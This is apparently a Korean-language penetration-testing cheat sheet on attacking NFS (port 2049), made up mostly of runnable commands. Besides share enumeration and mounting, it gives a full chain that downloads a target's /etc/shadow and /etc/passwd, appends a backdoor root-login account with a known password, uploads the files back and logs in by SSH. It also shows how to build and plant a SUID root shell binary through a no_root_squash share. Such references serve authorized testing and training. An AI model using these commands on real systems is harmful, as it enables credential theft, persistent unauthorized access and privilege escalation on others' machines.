---
sidebar_position: 8
---

# NFS - 2049

## 기본 정보

**포트**: 2049

NFS(Network File System)는 네트워크를 통해 파일 시스템을 공유하는 프로토콜입니다.

## showmount

```bash
# NFS 공유 목록 확인
/usr/sbin/showmount -e <RHOST>
sudo showmount -e <RHOST>
```

## 마운트

```bash
# NFS 마운트
sudo mount -t nfs -o vers=4,nolock <RHOST>:/<FOLDER> /PATH/TO/FOLDER/<FOLDER>

# NFSv3 마운트
sudo mount -t nfs -o vers=3,nolock <RHOST>:/<FOLDER> /PATH/TO/FOLDER/<FOLDER>
```

## SUID 설정

```bash
# SUID 비트 설정 (권한 상승용)
chown root:root sid-shell
chmod +s sid-shell
```

## NetExec

### 공유 열거

```bash
# 기본 열거
netexec nfs <RHOST>

# 공유 목록
netexec nfs <RHOST> --shares

# 공유 상세 열거
netexec nfs <RHOST> --enum-shares

# 특정 공유의 파일 목록
netexec nfs <RHOST> --share '/var/nfs/general' --ls '/'
```

### 파일 처리

```bash
# 파일 다운로드
netexec nfs <RHOST> --get-file /PATH/TO/FOLDER/<FILE> <FILE>

# 파일 업로드
netexec nfs <RHOST> --put-file <FILE> /PATH/TO/FOLDER/<FILE>
```

### Root 파일 시스템 탈출 (Escape)

```bash
# 루트 디렉토리 접근
netexec nfs <RHOST> --ls '/'

# /etc/shadow 다운로드
netexec nfs <RHOST> --get-file '/etc/shadow' etc_shadow

# /etc/passwd 다운로드
netexec nfs <RHOST> --get-file '/etc/passwd' etc_passwd

# 백도어 사용자 추가
echo 'backdoor$6$QF0YMBn9$Gj7DTxYtq7ie3zTOSSHrFsp2DpWqTpV0xunqkGxU7UlK8tZkW6zzFNRy8GwsVqYFxflK0zPbAAKQt6VwAhWqsyO:18000:0:99999:7:::' >> etc_shadow
echo 'backdoor:x:1003:1001:,,,:/home/backdoor:/bin/bash' >> etc_passwd

# 수정된 파일 업로드
netexec nfs <RHOST> --put-file etc_shadow '/etc/shadow'
netexec nfs <RHOST> --put-file etc_passwd '/etc/passwd'

# SSH 로그인
ssh backdoor@<RHOST>
# Password: P@ssword123!
```

## Nmap

```bash
# NFS 포트 스캔
sudo nmap -p2049 -sV <RHOST>

# NFS 공유 열거
sudo nmap -p111,2049 --script nfs-ls <RHOST>
sudo nmap -p111,2049 --script nfs-showmount <RHOST>
sudo nmap -p111,2049 --script nfs-statfs <RHOST>
```

## 권한 상승 기법

### no_root_squash 악용

```bash
# NFS 공유 마운트
mkdir /tmp/nfs
sudo mount -t nfs <RHOST>:/share /tmp/nfs

# SUID 바이너리 컴파일 및 업로드
cat > shell.c << EOF
#include <stdio.h>
#include <unistd.h>
int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF

gcc shell.c -o shell
sudo cp shell /tmp/nfs/
sudo chown root:root /tmp/nfs/shell
sudo chmod +s /tmp/nfs/shell

# 타겟에서 실행
./shell
```

## 참고

- no_root_squash: root 권한 유지 (권한 상승 가능)
- root_squash: root를 nobody로 매핑 (기본값)
- /etc/exports 파일 확인
- RPC 포트 111도 함께 확인
- SUID 바이너리를 통한 권한 상승
